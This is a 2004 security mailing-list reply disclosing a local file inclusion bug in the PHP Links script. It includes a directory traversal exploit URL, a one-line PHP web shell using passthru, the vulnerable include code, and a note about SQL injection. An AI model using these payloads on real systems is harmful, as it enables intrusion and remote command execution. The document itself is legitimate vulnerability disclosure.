In-Reply-To: <20041003143325.23880.qmail@www.securityfocus.com>


Hi,

This is also a php inclusion bug. You can include
any .php script on remote system with "PHP Links".

Request like this will include script "execute.php"
in "/some/some" directory:
www.site.com/phplinks/index.php?show=../../../../../../some/some/execute

So, if you have FTP access to that system, and you can
upload some php script, you can also execute it with this bug. 

That script could be some something like this:
----
<?passthru($cmd);?>
----

Vulnerable code in PHP Links include.php:
----

if(isset($show)){

        if($show == "new" || $show == "pop" || $show == "cool"){

                include("include/show.php");
        } else {

                include("include/$show.php"); // <-- HERE
        }
}
----


There is also SQL inject bug in all php scripts,
because ID field isn't checked for special characters.


>
>Nkxtox Advisory 0000-00003
>
>Full path disclosure in PHP Links
>
>Date: 03/10/04
>
>Bug:
>
>http://server/phplinks/index.php?show=juax0rx
>
>Warning: main(include/juax0rx.php): failed to open stream: No such file or directory in 
>/home/h4x0rsit3/b0x/phplinks/index.php on line 198
>
>Warning: main(): Failed opening 'include/juax0rx.php' for inclusion 
>(include_path='.') in /home/h4x0rsit3/b0x/phplinks/index.php on line 198
>


------------------------------------
 LSS Security Team, <eXposed by LSS>

 WWW    : http://security.lss.hr
 E-mail : security@LSS.hr
 Tel    : +385 1 6129 775
